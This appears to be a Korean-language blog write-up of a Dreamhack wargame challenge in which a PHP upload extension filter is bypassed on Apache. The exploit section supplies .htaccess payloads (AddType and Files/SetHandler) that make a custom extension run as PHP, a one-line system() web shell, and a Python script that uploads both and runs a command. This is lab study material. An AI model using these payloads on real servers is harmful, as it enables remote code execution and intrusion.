---
title: "[Dreamhack] Apache htaccess"
tags:
    - File Upload
date: "2024-08-08"
thumbnail: "/assets/Apache_htaccess/문제.png"
---

# Intro
---
[Dreamhack][Dreamhack]의 WarGame 中 [Apache htaccess][Apache htaccess]문제에 대한 **Write-up**을 작성하고자 한다.

# Analysis
---
#### Site
웹셸 파일을 업로드하여 RCE를 통해 FLAG 파일을 획득하는 것이 목표이다.
![site](/assets/Apache_htaccess/01_analysis_1.png){: style="border: 1px solid;"}

#### Extension Filtering
아래의 코드와 같이 `php`, `php3` 등의 확장자가 필터링되어 있다. 이러한 확장자 필터링을 우회하여 웹셸이 동작하도록 한다.
```php
<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");
?>
```

#### .htaccess
`.htaccess` 파일은 디렉터리 별로 설정을 변경할 수 있는 파일이다. 여러 설정 지시어가 있는 파일이 특정 문서 디렉터리에 위치한다면, 그 디렉터리와 모든 하위 디렉터리에 해당 지시어 설정을 적용한다.
Apache 설정파일인 `000-default.conf`파일의 `Driectory` 섹션에 파일이 위치한 경로와 디렉터리 접근 허용 여부에 대한 설정을 확인한다.
Driectory 섹션의 `AllowOverride` 지시자 설정이 최소한 `FileInfo`로 설정되어 있다면 .htaccess 파일 사용을 허용하게 된다.
```plainText
-- /etc/apache2/sites-enabled/000-default.conf --
-- /etc/apache2/apache2.conf --
<Directory /var/www/html/>
    AllowOverride All
    Require all granted
</Directory>
```

# Exploit
---
- `.htaccess` 파일의 `AddType` 지시자를 통해 특정 확장자 MIME 타입 지정
- `.htaccess` 파일의 `Files` 태그를 이용하여 특정 파일 MIME 타입 지정

#### AddType 지시자 이용
서버에 다음과 같은 `.htaccess`파일을 올려 `.silvain` 확장자를 가진 파일의 MIME 타입을 서버에서 실행이 가능한 PHP 파일로 동작하도록 설정한다.
```plainText
AddType application/x-httpd-php .silvain
```

이후 웹셸 파일에 접근하여 `ls -l /` 명령어를 실행하여 flag 파일의 위치를 확인하고, 실행 권한이 부여되어 있는 것을 확인하여 `/flag` 명령어로 flag 파일을 실행한다.
![ls](/assets/Apache_htaccess/02_Exploit_1.png){: style="border: 1px solid;"}

#### AddType 지시자 및 Python 코드 이용
동일하게 `.htaccess`파일 및 웹셸을 업로드하여 flag를 확인하는 코드를 작성해보자.
```Python
from requests import *
url = "http://host3.dreamhack.games:8848/"

data = {"file":(".htaccess","AddType application/x-httpd-php .silvain")}
post(f'{url}upload.php',files=data)

data = {"file":("webshell.silvain","<?php echo system($_GET['cmd']);?>")}
post(f'{url}upload.php',files=data)

data = {"cmd":"/flag"}
print(get(f'{url}upload/webshell.silvain', params=data).text)
```

### Files 태그 이용
서버에 다음과 같은 `.htaccess`파일을 올려 `silvain` 확장자를 가진 파일에 PHP 핸들러를 지정하여 PHP 스크립트로 처리하도록 설정한다.
```plainText
<Files "*.silvain">
    SetHandler application/x-httpd-php
</Files>
```

아래는 실행파일 `flag`를 실행한 결과이다.
![flag](/assets/Apache_htaccess/02_Exploit_2.png){: style="border: 1px solid;"}

[Dreamhack]:https://dreamhack.io/
[Apache htaccess]:https://dreamhack.io/wargame/challenges/418